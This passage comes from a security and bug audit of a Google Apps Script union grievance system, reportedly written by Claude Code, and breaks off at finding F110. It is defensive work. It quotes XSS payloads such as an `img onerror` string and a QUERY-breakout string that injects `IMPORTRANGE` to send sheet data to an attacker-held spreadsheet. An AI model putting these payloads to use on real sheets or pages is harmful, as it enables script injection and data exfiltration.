**Status:** Not a data corruption bug in most cases, but the pattern is fragile and error-prone. The canonical `GRIEVANCE_COLS` (1-indexed) with `- 1` for array access should be used instead, per CLAUDE.md rules.

---

#### F84. Wrong column constant in `10_Main.gs`
**Severity:** HIGH | **Category:** Bug | **Line:** 1829

```javascript
const memberId = data[MEMBER_COLUMNS.ID];
```

`MEMBER_COLUMNS.ID` is the 0-indexed constant. Whether this is correct depends on whether `data` is a single row array (where 0-indexed is correct) or part of a 2D array. The inconsistency with adjacent code that uses `MEMBER_COLS` (1-indexed) makes this error-prone.

---

#### F85. ~~Unescaped data in `composeEmailForMember()` dialog~~ **FIXED**
**Severity:** HIGH | **Category:** Security | **Line:** `03_UIComponents.gs:1656`
**Fixed:** Wrapped `name`, `email`, `memberId` with `escapeHtml()` for HTML context. Replaced string concatenation with `JSON.stringify()` for JS `sendQuickEmail` call.

```javascript
'<div class="info"><strong>' + name + '</strong> (' + memberId + ')<br>' + email + '</div>'
// Also in the JS call:
'google.script.run.sendQuickEmail("' + email + '",s,m,"' + memberId + '")'
```

`name`, `email`, `memberId` are unescaped in both HTML and JavaScript string contexts. Compare with `showMemberQuickActions()` at line 1526 which correctly uses `escapeHtml()`.

**Fix:** Use `escapeHtml()` for HTML context and `JSON.stringify()` for JS string context.

---

#### F86. ~~Unescaped error messages in search dialogs~~ **FIXED**
**Severity:** MEDIUM | **Category:** Security | **Lines:** `03_UIComponents.gs:2379, 2710`
**Fixed:** Wrapped `error.message` and `e.message` with `escapeHtml()` in both locations.

```javascript
// Line 2379 (desktop search):
document.getElementById('resultsContainer').innerHTML =
  '<div class="no-results"><p>Error: ' + error.message + '</p></div>';

// Line 2710 (advanced search):
document.getElementById('resultsBody').innerHTML =
  '<tr><td colspan="5" ...>Error: ' + e.message + '</td></tr>';
```

Error messages are injected into `innerHTML` without `escapeHtml()`. If a server-side error message contains HTML/script, it would execute.

**Fix:** `escapeHtml(error.message)` in both locations.

---

#### F87. Column indexing bug in `05_Integrations.gs`
**Severity:** HIGH | **Category:** Bug | **Lines:** 365-366, 385, 394

```javascript
// Line 365-366:
if (data[i][GRIEVANCE_COLUMNS.GRIEVANCE_ID] === grievanceId) {     // 0-indexed array ✓
  sheet.getRange(i + 1, GRIEVANCE_COLUMNS.DRIVE_FOLDER + 1).setValue(folderUrl);  // 0-indexed + 1 for Range
}
// Line 385:
const folderUrl = sheet.getRange(row, GRIEVANCE_COLUMNS.DRIVE_FOLDER + 1).getValue();
// Line 394:
const grievanceId = sheet.getRange(row, GRIEVANCE_COLUMNS.GRIEVANCE_ID + 1).getValue();
```

Uses `GRIEVANCE_COLUMNS` (0-indexed) with `+ 1` for `getRange()` calls. While mathematically equivalent to `GRIEVANCE_COLS` (1-indexed), this violates the CLAUDE.md rule to use canonical `GRIEVANCE_COLS` for Range operations. The `+ 1` pattern is fragile — if someone removes the `+ 1` thinking GRIEVANCE_COLUMNS is already 1-indexed, data goes to the wrong column.

**Fix:** Use `GRIEVANCE_COLS.DRIVE_FOLDER_URL` and `GRIEVANCE_COLS.GRIEVANCE_ID` directly.

---

#### F88. ~~Missing formula escaping in `13_MemberSelfService.gs`~~ **FIXED**
**Severity:** MEDIUM | **Category:** Security | **Line:** 1146
**Fixed:** Added `escapeForFormula(value)` before `setValue()` call.

```javascript
sheet.getRange(memberRow, fieldMapping[field]).setValue(value);
```

Member self-service profile updates write user-supplied values to cells without `escapeForFormula()`. If a member enters `=IMPORTRANGE(...)` as their address, it would be interpreted as a formula.

**Fix:** `sheet.getRange(memberRow, fieldMapping[field]).setValue(escapeForFormula(value));`

---

#### F89. HTML injection in `16_DashboardEnhancements.gs` email reports
**Severity:** MEDIUM | **Category:** Security | **Lines:** 223-235

```javascript
html += '<tr><td>Total Members</td><td ...>' + data.totalMembers + '</td></tr>';
html += '<tr><td>' + data.monthlyFilings[m].month + '</td><td ...>' + data.monthlyFilings[m].count + ' filed</td></tr>';
```

While most values are numeric (low risk), `data.monthlyFilings[m].month` could contain HTML if the month label is derived from user-controlled data. Inconsistent with escaping practices elsewhere.

**Fix:** `escapeHtml(String(data.monthlyFilings[m].month))`

---

#### F90. ~~Incomplete XSS prevention in `10_Main.gs`~~ **FIXED**
**Severity:** MEDIUM | **Category:** Security | **Lines:** 1834-1839
**Fixed:** Replaced regex character stripping with `JSON.stringify()` for both `memberId` and `memberName` in the `sessionStorage.setItem` script context.

```javascript
const safeMemberId = String(memberId || '').replace(/['"\\<>&]/g, '');
const safeMemberName = String(memberName || '').replace(/['"\\<>&]/g, '');
const html = HtmlService.createHtmlOutput(
  '<script>' +
    'sessionStorage.setItem("prefillMemberId", "' + safeMemberId + '");' +
    'sessionStorage.setItem("prefillMemberName", "' + safeMemberName + '");' +
```

Uses regex character removal instead of proper escaping. This strips characters instead of escaping them (lossy), and doesn't handle all JS injection vectors (backticks, `${}`). Per CLAUDE.md, the correct pattern is `JSON.stringify()`.

**Fix:** `'sessionStorage.setItem("prefillMemberId", ' + JSON.stringify(memberId) + ');'`

---

#### F91. Column indexing `GRIEVANCE_COLUMNS + 1` pattern in `10_Main.gs`
**Severity:** MEDIUM | **Category:** Bug | **Lines:** 1519-1541

```javascript
if (data[i][GRIEVANCE_COLUMNS.GRIEVANCE_ID] === grievanceId) {  // 0-indexed array access
  rowIndex = i + 1;
}
// Then:
sheet.getRange(rowIndex, GRIEVANCE_COLUMNS.DESCRIPTION + 1).setValue(updates.description);
```

Same pattern as F87 — uses `GRIEVANCE_COLUMNS` (0-indexed) with `+ 1` for `getRange()` instead of canonical `GRIEVANCE_COLS`. Works but violates project standards and is fragile.

---

#### F92. ~~Unescaped grievance data in `showMemberGrievanceHistory()`~~ **FIXED**
**Severity:** MEDIUM | **Category:** Security | **Line:** `03_UIComponents.gs:1948`
**Fixed:** Wrapped `g.id`, `g.status`, `g.step`, `g.issue` with `escapeHtml()`.

```javascript
return '<div ...><strong>' + g.id + '</strong><br><span ...>Status: ' + g.status +
  ' | Step: ' + g.step + '</span><br><span ...>' + g.issue + ' | Filed: ' + ...</span></div>';
```

`g.id`, `g.status`, `g.step`, `g.issue` are all unescaped in HTML context.

**Fix:** `escapeHtml(g.id)`, `escapeHtml(g.status)`, etc.

---

#### F93. `window.open()` with server callback URL in `06_Maintenance.gs`
**Severity:** MEDIUM | **Category:** Security | **Line:** 1399

```javascript
'function exportHistory(){google.script.run.withSuccessHandler(function(url){alert("Exported!");window.open(url,"_blank")}).exportUndoHistoryToSheet()}'
```

The `url` returned from `exportUndoHistoryToSheet()` is passed directly to `window.open()` without validation. While this is a server-controlled value, a compromised server response or future code change could inject a malicious URL.

**Fix:** Validate the URL format client-side before opening: `if(/^https:\/\/docs\.google\.com\//.test(url)) window.open(url,"_blank");`

---

#### F94. ~~Empty sheet crash risk — 9 instances in `04c_InteractiveDashboard.gs`~~ **VERIFIED FALSE POSITIVE**
**Severity:** ~~HIGH~~ N/A | **Category:** Bug | **Lines:** 1067, 1091, 1162, 1199, 1245, 1252, 1353, 1391, 1516

**Correction (2026-02-21):** Cross-cutting verification confirmed all 9 instances are properly guarded:
- Lines 1066, 1090, 1251, 1352, 1390, 1514 use `if (sheet && sheet.getLastRow() > 1)` guards
- Lines 1159, 1196, 1242 use `if (!sheet || sheet.getLastRow() <= 1) return [];` guards

All `getLastRow() - 1` calls only execute when `getLastRow() >= 2`, so the result is always `>= 1`. No crash risk.

**Note:** Line 1745 in the same file (`sheet.getRange(2, MEMBER_COLS.MEMBER_ID, sheet.getLastRow() - 1, 1)` in `edit` mode) IS unguarded, but this is within the edit branch where members must exist to be edited. Low practical risk.

---

#### F95. ~~Unescaped CSV preview data in `04b_AccessibilityFeatures.gs`~~ **FIXED**
**Severity:** MEDIUM | **Category:** Security | **Lines:** 505-515
**Fixed:** Added `getClientSideEscapeHtml()` to script block. Wrapped CSV cell values with `.map(function(c){return escapeHtml(c)})` before `.join()`.

```javascript
'previewHtml += "<div class=\\"preview-row\\">" + rows[i].join(" | ") + "</div>";'
```

CSV row data from user-uploaded files is joined and injected into `innerHTML` without `escapeHtml()`. A CSV file containing `<img src=x onerror=alert(1)>` as a cell value would execute.

**Fix:** `rows[i].map(function(cell) { return escapeHtml(String(cell)); }).join(" | ")`

---

#### F96. Unescaped error messages in `04b_AccessibilityFeatures.gs`
**Severity:** MEDIUM | **Category:** Security | **Lines:** 539, 542

```javascript
'showStatus("❌ " + result.error, "error");'
'showStatus("❌ Error: " + err.message, "error");'
```

Error messages from server responses are concatenated without escaping. If `showStatus()` uses `innerHTML` (which it does), these become XSS vectors.

**Fix:** `'showStatus("❌ " + escapeHtml(result.error), "error")'`

---

#### F97. ~~Unescaped `data-search` attribute in `04e_PublicDashboard.gs`~~ **FIXED**
**Severity:** MEDIUM | **Category:** Security | **Line:** 2183
**Fixed:** Wrapped the concatenated search string with `escapeHtml()` to prevent attribute breakout.

```javascript
'data-search=\\""+((n.name||"")+" "+(n.date||"")+" "+(n.type||"")).toLowerCase()+"\\"'
```

Meeting names, dates, and types are concatenated into a `data-search` HTML attribute without `escapeHtml()`. A meeting name containing a double-quote could break out of the attribute and inject arbitrary HTML attributes.

**Fix:** `'data-search=\\""+escapeHtml((n.name||"")+" "+(n.date||"")+" "+(n.type||"")).toLowerCase()+"\\"'`

---

#### F98. Column indexing `MEMBER_COLUMNS + 1` pattern in `08b_SearchAndCharts.gs`
**Severity:** MEDIUM | **Category:** Bug | **Line:** 354

```javascript
var data = memberSheet.getRange(2, MEMBER_COLUMNS.JOB_TITLE + 1, ...);
```

Uses `MEMBER_COLUMNS` (0-indexed) with `+ 1` for `getRange()` instead of canonical `MEMBER_COLS.JOB_TITLE`. Same fragile pattern as F87 and F91. Lines 262-387 also use `MEMBER_COLUMNS` for array access (which is correct), but mixing the two patterns in the same function increases confusion.

**Fix:** Use `MEMBER_COLS.JOB_TITLE` for Range operations.

---

#### F99. ~~Hardcoded range limit `A2:A1000` in `08a_SheetSetup.gs`~~ **FIXED**
**Severity:** MEDIUM | **Category:** Bug | **Line:** 354
**Fixed:** Changed to `memberSheet.getLastRow()` dynamically with `Math.max(lastRow, 2)` guard.

```javascript
var sourceRange = memberSheet.getRange(memberIdCol + '2:' + memberIdCol + '1000');
```

Member ID validation dropdown is limited to 1000 rows. Unions with >1000 members will have incomplete dropdown validation.

**Fix:** Use `memberSheet.getLastRow()` dynamically: `memberIdCol + '2:' + memberIdCol + memberSheet.getLastRow()`

---

#### F100. ~~Division by zero risk in `08c_FormsAndNotifications.gs`~~ **FIXED**
**Severity:** MEDIUM | **Category:** Bug | **Line:** 1833
**Fixed:** Added `isNaN(reminderDate.getTime())` guard before date arithmetic; invalid dates now skip via `continue`.

```javascript
var daysSinceReminder = (now - new Date(lastReminder)) / (1000 * 60 * 60 * 24);
```

If `lastReminder` is null or an invalid date string, `new Date(lastReminder)` returns `Invalid Date`, causing the subtraction to yield `NaN`. Subsequent comparisons (`daysSinceReminder < 7`) become false, silently disabling the cooldown.

**Fix:** `if (!lastReminder || isNaN(new Date(lastReminder).getTime())) continue;`

---

#### F101. ~~Falsy values silently dropped from member filters in `00_DataAccess.gs`~~ **FIXED**
**Severity:** HIGH | **Category:** Data Loss | **Lines:** 404, 407-408
**Fixed:** Changed `!row[...]` to explicit `=== '' || == null` check. Added `String()` coercion to filter comparisons.

```javascript
// Skip empty rows
if (!row[MEMBER_COLUMNS.MEMBER_ID]) continue;  // Line 404 — also skips "0" or false IDs

// Apply filters
if (options.unit && row[MEMBER_COLUMNS.UNIT] !== options.unit) continue;  // Line 407 — strict !== with no type coercion
if (options.location && row[MEMBER_COLUMNS.WORK_LOCATION] !== options.location) continue;  // Line 408
```

**Issue:** The filter at line 404 uses `!row[...]` which skips rows with falsy MEMBER_ID values (0, false, empty string). Lines 407-408 use strict `!==` comparison between values that may have different types (numbers vs strings from Google Sheets). A unit value of `0` in the spreadsheet would be type `number`, while the filter option would be string `"0"` — these fail strict equality, silently excluding matching rows.

**Fix:** Use explicit empty check: `if (row[MEMBER_COLUMNS.MEMBER_ID] === '' || row[MEMBER_COLUMNS.MEMBER_ID] == null) continue;` and coerce types in filters: `String(row[MEMBER_COLUMNS.UNIT]) !== String(options.unit)`.

---

#### F102. ~~Silent filtering errors in grievance queries in `00_DataAccess.gs`~~ **FIXED**
**Severity:** HIGH | **Category:** Data Loss | **Lines:** 496-504
**Fixed:** Changed `!row[...]` to explicit `=== '' || == null` check. Added `String()` coercion to status and steward filter comparisons.

```javascript
if (!row[GRIEVANCE_COLUMNS.GRIEVANCE_ID]) continue;  // Line 496

if (options.status && row[GRIEVANCE_COLUMNS.STATUS] !== options.status) continue;  // Line 499
if (options.steward && row[GRIEVANCE_COLUMNS.STEWARD] !== options.steward) continue;  // Line 500
if (options.overdueOnly) {
  var daysToDeadline = row[GRIEVANCE_COLUMNS.DAYS_TO_DEADLINE];  // Line 502
  if (typeof daysToDeadline !== 'number' || daysToDeadline >= 0) continue;  // Line 503
}
```

**Issue:** Same type-mismatch problem as F101. Additionally, the `overdueOnly` filter at line 503 silently excludes rows where `DAYS_TO_DEADLINE` is a date string, formula error, or empty — these might be legitimately overdue grievances with missing deadline data. The filter hides data quality issues rather than surfacing them.

**Fix:** Add type coercion for string comparisons. For `overdueOnly`, log or flag rows with non-numeric deadline values instead of silently dropping them.

---

#### F103. `buildSafeQuery()` vulnerable to formula injection in `00_Security.gs`
**Severity:** MEDIUM | **Category:** Security | **Lines:** 238-248

```javascript
function buildSafeQuery(sheetName, query, headers) {
  var safeSheet = safeSheetNameForFormula(sheetName);
  var safeHeaders = parseInt(headers, 10) || 1;
  var safeQuery = String(query)
    .replace(/'/g, "''")
    .replace(/"/g, '\\"');
  return '=QUERY(' + safeSheet + '!A:Z, "' + safeQuery + '", ' + safeHeaders + ')';
}
```

**Issue:** The function only escapes single and double quotes, but a query like `foo", 0) + IMPORTRANGE("attacker-sheet-id", "A1` could break out of the QUERY string context and inject an `IMPORTRANGE` call that exfiltrates data to an external spreadsheet. The escaped `\"` in JavaScript becomes a literal `"` in the formula string, which the Sheets formula parser interprets as a string delimiter.

**Fix:** Validate query against an allowlist of safe QUERY syntax tokens, or use parameterized queries instead of string concatenation.

---

#### F104. ~~Case-sensitive admin email comparison in `00_Security.gs`~~ **FIXED**
**Severity:** MEDIUM | **Category:** Security | **Lines:** 347 vs 358
**Fixed:** Changed `owner.getEmail() === email` to `owner.getEmail().toLowerCase() === email.toLowerCase()`.

```javascript
// Admin check — case-sensitive
if (owner && owner.getEmail() === email) {  // Line 347
  return 'admin';
}
// ...
// Steward check — case-insensitive
if (memberEmail.toLowerCase() === email.toLowerCase()) {  // Line 358
```

**Issue:** The admin role check at line 347 uses strict equality (`===`), which is case-sensitive. Google Workspace emails are case-insensitive (`Admin@example.com` is the same as `admin@example.com`). If `Session.getActiveUser().getEmail()` returns a differently-cased email than `ss.getOwner().getEmail()`, the spreadsheet owner would be denied admin access. The steward check at line 358 correctly uses `.toLowerCase()`.

**Fix:** `if (owner && owner.getEmail().toLowerCase() === email.toLowerCase())`

---

#### F105. `safeJsonForHtml()` doesn't escape object keys in `00_Security.gs`
**Severity:** MEDIUM | **Category:** Security | **Lines:** 699-712

```javascript
function safeJsonForHtml(data) {
  if (!data) return '{}';
  var json = JSON.stringify(data, function(key, value) {
    if (typeof value === 'string') {
      return escapeHtml(value);  // Only escapes VALUES, not keys
    }
    return value;
  });
  return json.replace(/<\/script>/gi, '<\\/script>');
}
```

**Issue:** The replacer function only escapes string values, but object keys are also embedded in the JSON output. If an object has a user-controlled key like `{"<img src=x onerror=alert(1)>": "safe"}`, the key is not escaped. The `</script>` replacement on line 711 protects against script context breakout, but if the JSON output is later used in an innerHTML context (not its intended use), the unescaped keys become live HTML.

**Fix:** Also escape keys in the replacer, or document clearly that this function's output must only be embedded in `<script>` contexts, never innerHTML.

---

#### F106. `sendDailySecurityDigest()` references `CONFIG_COLS` without existence check in `00_Security.gs`
**Severity:** MEDIUM | **Category:** Robustness | **Lines:** 938-1057

```javascript
function sendDailySecurityDigest() {
  try {
    if (typeof getConfigValue_ === 'function') {
      try {
        var chiefEmail = getConfigValue_(CONFIG_COLS.CHIEF_STEWARD_EMAIL);  // CONFIG_COLS may not exist
        var adminEmails = getConfigValue_(CONFIG_COLS.ADMIN_EMAILS);
      } catch (_e) { /* skip */ }
    }
```

**Issue:** The function checks if `getConfigValue_` is defined but does not check if `CONFIG_COLS` is defined. If `01_Core.gs` hasn't loaded yet (due to script execution order) or `CONFIG_COLS` is renamed, this throws a `ReferenceError` caught silently by the inner catch. The function proceeds with no recipients, so security digest emails are silently never sent.

**Fix:** Add `typeof CONFIG_COLS !== 'undefined'` guard before accessing its properties.

---

#### F107. `escapeHtml()` over-escapes `/` and `=`, potentially breaking URLs in `00_Security.gs`
**Severity:** MEDIUM | **Category:** Bug | **Lines:** 130-143

```javascript
function escapeHtml(input) {
  return String(input)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/\//g, '&#x2F;')   // ← Escapes all forward slashes
    .replace(/`/g, '&#x60;')
    .replace(/=/g, '&#x3D;');   // ← Escapes all equals signs
}
```

**Issue:** Escaping `/` and `=` is overly aggressive for most HTML contexts. When `escapeHtml()` is applied to a URL like `https://docs.google.com/spreadsheets`, it becomes `https&#x3D;&#x2F;&#x2F;docs.google.com&#x2F;spreadsheets`, which breaks `href` attributes. This is safe for innerHTML text content but problematic when the function is used to escape URL values in attributes.

**Fix:** For URL contexts, use a separate `escapeAttribute()` that only escapes `<`, `>`, `"`, `&`. Document that `escapeHtml()` is for text content only, not for URL values.

---

#### F108. `validateWebAppRequest()` treats empty parameters as valid in `00_Security.gs`
**Severity:** MEDIUM | **Category:** Security | **Lines:** 381-390

```javascript
function validateWebAppRequest(e) {
  var result = { isValid: true, params: {}, errors: [] };
  if (!e || !e.parameter) {
    return result;  // No parameters is valid — returns isValid: true
  }
```

**Issue:** A request with no parameters (no `mode`, no `page`, no authentication tokens) is returned as `{ isValid: true, params: {} }`. Callers that check `result.isValid` without also checking for required parameters like `mode` may route the request to a default page unintentionally. This is a permissive-by-default design.

**Fix:** Either return `isValid: false` for requests with no parameters, or document that callers must check for required params independently.

---

### Cross-Cutting Verification Notes (2026-02-21)

**Column Indexing — Verified Safe:** A comprehensive search of all `GRIEVANCE_COLUMNS` and `MEMBER_COLUMNS` usage across the entire codebase confirmed:
- All `getRange()` calls with 0-indexed constants correctly add `+ 1` (15+ instances)
- All array access uses 0-indexed constants directly (85+ instances)
- No mathematical indexing errors found. The concern in F83, F91, F98 is about using **deprecated** constants (maintainability debt), not incorrect indexing math.

**`getLastRow()` Patterns — Verified Mostly Safe:** Of 94 `getLastRow()` instances across 24 files, 93 are properly guarded with `< 2`, `<= 1`, or `> 1` checks. One unguarded instance at `04c_InteractiveDashboard.gs:1745` is in an edit-mode branch with low practical risk.

**LockService — Confirmed Underutilized:** Only 1 function (`generateChecklistId_()` in `12_Features.gs:114`) uses `LockService`. This confirms F52: bulk mutation operations like `bulkUpdateGrievanceStatuses()` (`02_DataManagers.gs:2060`) and `advanceGrievanceStep()` (`02_DataManagers.gs:1770`) perform multiple non-atomic sheet writes without locks.

---

## Summary of Actionable Recommendations

### Priority 1 — Fix Now (CRITICAL + HIGH)

| ID | Summary | Effort |
|----|---------|--------|
| F22/a/b/c | XSS: Add client-side `escapeHtml()` to mobile search, grievance list, advanced search, onclick attrs | Small |
| F34a | XSS: Use `JSON.stringify()` for URLs in `setupFolderForSelectedGrievance()` | Trivial |
| F34b | XSS: Use `JSON.stringify()` for URLs in `createPDFForSelectedGrievance()` | Trivial |
| F34c | XSS: Add `escapeHtml()` to email HTML bodies (meeting attendance, docs) | Small |
| F23 | XSS: Escape data in grievance quick actions dialog | Small |
| F23a | Validate row/status in `quickUpdateGrievanceStatus()` | Small |
| F23b | Add email validation + rate limiting to `sendQuickEmail()` | Medium |
| F10 | Update VERSION_INFO/API_VERSION to 4.9.0 | Trivial |
| F68 | Update package.json version to 4.9.0 | Trivial |
| F72 | `chmod +x .husky/pre-commit` (hook is silently not running!) | Trivial |
| F14 | Fix array sizing with MEMBER_HEADER_MAP_.length | Trivial |
| F19 | Sanitize CSV preview data with escapeHtml() | Small |
| F35b | XSS: Escape data in audit log viewer HTML | Small |
| F35c | XSS: Escape steward names in workload dashboard | Small |
| F34d | Fix race condition: use `e.range` instead of `getLastRow()` in form handler | Small |
| F15 | Batch setValue() calls in addMember() | Small |
| F35a | Fix undo system UserProperties 9KB overflow | Medium |
| F70 | Re-enable critical ESLint rules (no-undef, no-dupe-args, etc.) | Medium |
| F69 | Fix Jest coverage collection for .gs files or remove misleading config | Small |
| F57 | Add PIN brute-force rate limiting | Medium |
| F52 | Add LockService to sync functions | Medium |
| CC3 | Add LockService to all mutation paths | Medium |
| F47 | Defer non-critical work from onOpen() | Medium |
| F35 | Mask email in audit log entries | Small |
| F28 | Plan file splitting for 04e_PublicDashboard.gs | Large |
| F76 | XSS: Use `JSON.stringify()` for formUrl in `08c_FormsAndNotifications.gs:213, 622` | Trivial |
| F77 | XSS: Use `JSON.stringify()` for folderUrl in `10d_SyncAndMaintenance.gs:223, 233, 597` | Trivial |
| F78 | XSS: Add `escapeHtml()` to overdue items in `05_Integrations.gs:1928` | Trivial |
| F79 | XSS: Add `escapeHtml()` to steward names in `04d_ExecutiveDashboard.gs:690-694` | Trivial |
| F81 | XSS: Replace onclick injection with data attributes in `04c_InteractiveDashboard.gs:491` | Small |
| F82 | XSS: Replace onclick injection with data attributes in `04e_PublicDashboard.gs:2499` | Small |
| F84 | Fix column constant usage in `10_Main.gs:1829` | Trivial |
| F85 | XSS: Escape data in `composeEmailForMember()` dialog in `03_UIComponents.gs:1656` | Small |
| F87 | Fix column indexing pattern in `05_Integrations.gs:365-394` (use GRIEVANCE_COLS) | Small |
| ~~F94~~ | ~~Fix 9 `getLastRow() - 1` empty-sheet crashes~~ **VERIFIED FALSE POSITIVE** — all 9 instances are properly guarded | N/A |
| F101 | Fix type-mismatch in member filters (`00_DataAccess.gs:404-408`) -- use `String()` coercion | Small |
| F102 | Fix type-mismatch in grievance filters (`00_DataAccess.gs:496-504`) -- use `String()` coercion | Small |
| F109 | XSS: Validate URL scheme + escapeHtml for portal href attributes in `11_CommandHub.gs:3518-3519, 3602-3603` | Small |
| F112 | XSS: Escape template literal injections in reminder dialog `12_Features.gs:2310-2352` | Small |

### Priority 2 -- Plan for Next Release (MEDIUM)

| ID | Summary | Effort |
|----|---------|--------|
| F1 | Fix setCells() batching | Small |
| F6 | Mask all PII in security alert emails | Small |
| F8 | Document safeJsonForHtml() double-escape risk | Small |
| F9 | Add fallback in sendCriticalErrorNotification_() | Small |
| F12 | Cache COMMAND_CONFIG.SYSTEM_NAME | Small |
| F17 | Fix updateMember() field clearing bug | Small |
| F34 | Create safeSendEmail() wrapper | Medium |
| F61 | Add error isolation to EventBus handlers | Small |
| F67a | Read version dynamically in build.js | Small |
| F67b | Fix HTML $ escaping to only escape `${` | Small |
| F71a | Remove `\|\| true` from npm audit in CI | Trivial |
| F71b | Add npm cache to CI workflow | Trivial |
| F73 | Evaluate narrower OAuth scopes (drive.file) | Small |
| F74 | Add missing GAS global mocks (DocumentApp, etc.) | Small |
| F75 | Fix regex rewrites in test loader | Medium |
| CC2 | Begin HTML template migration | Large |
| CC5 | Standardize error handling patterns | Medium |
| F71 | Pin CI action versions to SHA | Small |
| F83 | Standardize GRIEVANCE_COLUMNS usage in `02_DataManagers.gs` (use GRIEVANCE_COLS - 1) | Medium |
| F86 | Escape error messages in search dialogs `03_UIComponents.gs:2379, 2710` | Trivial |
| F88 | Add `escapeForFormula()` to self-service profile updates `13_MemberSelfService.gs:1146` | Trivial |
| F89 | Escape month names in dashboard enhancement emails `16_DashboardEnhancements.gs:235` | Trivial |
| F90 | Use `JSON.stringify()` in `10_Main.gs:1834-1839` instead of regex strip | Small |
| F91 | Standardize column indexing in `10_Main.gs:1519-1541` | Small |
| F92 | Escape grievance data in `showMemberGrievanceHistory()` `03_UIComponents.gs:1948` | Trivial |
| F93 | Add URL validation in `06_Maintenance.gs:1399` undo export callback | Trivial |
| F95 | Escape CSV preview data in `04b_AccessibilityFeatures.gs:505-515` | Trivial |
| F96 | Escape error messages in `04b_AccessibilityFeatures.gs:539, 542` | Trivial |
| F97 | Escape `data-search` attribute in `04e_PublicDashboard.gs:2183` | Trivial |
| F98 | Standardize `MEMBER_COLUMNS + 1` in `08b_SearchAndCharts.gs:354` | Trivial |
| F99 | Fix hardcoded `A2:A1000` range limit in `08a_SheetSetup.gs:354` | Trivial |
| F100 | Fix division-by-zero risk in `08c_FormsAndNotifications.gs:1833` | Trivial |
| F103 | Fix `buildSafeQuery()` formula injection — validate query syntax in `00_Security.gs:238` | Small |
| F104 | Fix case-sensitive admin email comparison in `00_Security.gs:347` | Trivial |
| F105 | Document `safeJsonForHtml()` scope — keys not escaped, script-context only `00_Security.gs:699` | Trivial |
| F106 | Add `CONFIG_COLS` existence check in `sendDailySecurityDigest()` `00_Security.gs:938` | Trivial |
| F107 | Document `escapeHtml()` URL limitation — over-escapes `/` and `=` `00_Security.gs:130` | Small |
| F108 | Review `validateWebAppRequest()` empty-params-are-valid design `00_Security.gs:381` | Small |
| F110 | Escape member ID in portal footer `11_CommandHub.gs:3539` | Trivial |
| F111 | Add `escapeHtml()` to EventBus diagnostic dialog `15_EventBus.gs:415-428` | Trivial |
| F113 | Use `escapeHtml()` instead of manual quote escaping in reminder note values `12_Features.gs:2322, 2337` | Trivial |
| F114 | Add `escapeForFormula()` to expansion data writes `12_Features.gs:1857, 1861` | Trivial |
| F115 | Add `escapeForFormula()` to meeting check-in appendRow `14_MeetingCheckIn.gs:468` | Trivial |

### Priority 3 -- Backlog (LOW)

Low-severity items (F2, F3, F4, F5, F7, F11, F13, F18, F20, F24, F25, F26, F37, F40, F41, F43, F44, F49, F50, F53, F56, F60, F63, F65, F66, F67d, F68a, F68b, F71c, F74a, F80, F116, CC4, CC7) can be addressed during regular maintenance. F61, F62, F94 were verified as already fixed or false positives and removed from action items.

---

## Positive Observations

1. **Security-first design**: PII masking, SHA-256 hashing, XSS prevention, formula injection guards, audit logging with integrity hashes
2. **Auto-discovery column system**: Eliminates manual index maintenance, handles user-reordered sheets
3. **Comprehensive test suite**: 1,300+ tests across 23 suites
4. **Accessibility**: WCAG-aware design, keyboard navigation, color-blind support
5. **Progressive enhancement**: Mobile-optimized views, responsive design
6. **Operational tooling**: Diagnostics, health checks, self-healing formulas
7. **Batch operations**: Import/export with progress bars, batch writes
8. **Build system**: Proper CI/CD with ESLint, Jest, Husky, commitlint
9. **Zero-knowledge survey vault**: Industry-grade privacy design for anonymous surveys
10. **Hidden sheet enforcement**: API-level hiding + protection that works on mobile

---

*Initial review completed 2026-02-21 by Claude Code (Opus 4.6)*
*Re-verification update 2026-02-21: 33 new findings (F76–F108) added via cross-cutting pattern searches. 1 false positive corrected (F94 — all instances properly guarded). Cross-cutting column indexing and getLastRow() verification completed. All 120 original findings re-verified as still present.*

---

## 16. Thorough Re-Review Findings (2026-02-23 Update)

> The following findings were discovered during a thorough line-by-line re-review of all 30 source files, using parallel review agents covering each architectural layer plus a cross-cutting verification pass checking all `getClientSideEscapeHtml()`, `escapeHtml()`, `innerHTML`, `onclick`, `window.open()`, `escapeForFormula()`, and `LockService` patterns.

---

### F109. CRITICAL: `getClientSideEscapeHtml()` is a string literal in 15 out of 21 inclusion sites
**Severity:** CRITICAL | **Category:** XSS / Runtime Error | **Scope:** 15 instances across 9 files

The function `getClientSideEscapeHtml()` returns a string containing the client-side `escapeHtml()` function definition. The **correct** inclusion pattern is:

```javascript
'<script>' +
getClientSideEscapeHtml() +          // ← CORRECT: bare function call
'var data=[];'
```

**15 locations** use a broken pattern where the call is inside a string literal:

```javascript
'<script>' +
' + getClientSideEscapeHtml() + ' +  // ← BROKEN: string literal containing function name
'var data=[];'
```

This produces `<script> + getClientSideEscapeHtml() + var data=[]...` in the HTML. In the browser, `getClientSideEscapeHtml` is undefined, causing `ReferenceError` that prevents ALL JavaScript in the `<script>` block from executing.

**Broken instances (15):**

| File | Line | Affected Dialog |
|------|------|-----------------|
| `04c_InteractiveDashboard.gs` | 333 | Interactive Dashboard |
| `04d_ExecutiveDashboard.gs` | 205 | Executive Dashboard |
| `04e_PublicDashboard.gs` | 1745 | Public Dashboard (web app) |
| `05_Integrations.gs` | 2036, 2213, 2413 | Web App Search/Tracker/Directory |
| `09_Dashboards.gs` | 260, 3374, 3590 | Satisfaction/Steward/Meeting Dashboards |
| `11_CommandHub.gs` | 2506, 2811 | Command Hub/Batch Operations |
| `13_MemberSelfService.gs` | 1451 | Member Self-Service portal |
| `14_MeetingCheckIn.gs` | 771, 934 | Meeting Check-In/Attendance |
| `02_DataManagers.gs` | 1238 | Import Results dialog |

**Fix:** Change `' + getClientSideEscapeHtml() + '` to `getClientSideEscapeHtml() +` in all 15 locations.

---

### F109a. XSS in showGrievanceQuickActions email buttons — F23 partially reopened
**Severity:** CRITICAL | **Category:** XSS | **File:** `03_UIComponents.gs` | **Lines:** 1571-1573

F23 was marked FIXED for lines 1600-1612 but the email buttons at 1571-1573 were missed:

```javascript
'...emailGrievanceStatusToMember(\'' + grievanceId + '\');...to ' + memberEmail + '...'
'...emailSurveyToMember(\'' + memberId + '\');...'
'...emailContactFormToMember(\'' + memberId + '\');...'
```

Lines 1610-1612 in the SAME function correctly use `JSON.stringify()`.

**Fix:** Use `JSON.stringify()` for JS contexts and `escapeHtml()` for HTML content.

---

### F110. Quick Search missing `getClientSideEscapeHtml()`
